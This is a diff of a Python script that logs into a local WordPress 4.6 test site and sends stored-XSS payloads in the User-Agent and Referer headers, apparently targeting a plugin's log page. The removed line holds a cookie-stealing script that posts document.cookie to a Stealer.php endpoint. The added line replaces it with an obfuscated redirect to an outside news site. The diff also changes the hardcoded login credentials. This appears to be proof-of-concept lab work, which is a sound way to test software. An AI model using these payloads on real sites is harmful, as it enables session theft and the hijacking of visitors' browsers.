@@ -20,17 +20,19 @@ print "\n" + ("# " + browser.title() + "\n")
 browser.select_form("loginform")
 
 #Below I am filling out the form fields and submitting for log in
-browser.form['log'] = 'freh'
-browser.form['pwd'] = 'fratello'
+browser.form['log'] = 'marc98'
+browser.form['pwd'] = 'marco'
 browser.submit()
 
 print ("# " + browser.title() + "\n")
 
-header = {'User-Agent': '"<iframe src=/></iframe>', 'Referer': '"<script>location.href ="http://localhost:8888/Stealer.php?cookie="+document.cookie;</script>'}
+header = {'User-Agent': '"<iframe src=/></iframe>', 'Referer': '"<script>var a = /http:/ ; var b = /www.ansa.it/ ;window.location.replace((a+b).substr(1,18));</script>'}
 url = "http://localhost:8888/WordPress-4.6/fakepage"
 
 # wrap the request. You can replace None with the needed data if it's a POST request
 request = urllib2.Request(url, None, header)
+
+#
 
 print header
 
@@ -55,4 +57,5 @@ browser.open("http://localhost:8888/WordPress-4.6/wp-admin/admin.php?page=i4t3-l
 
 print ("# " + browser.title() + "\n")
 
+#print browser.response().read()
 
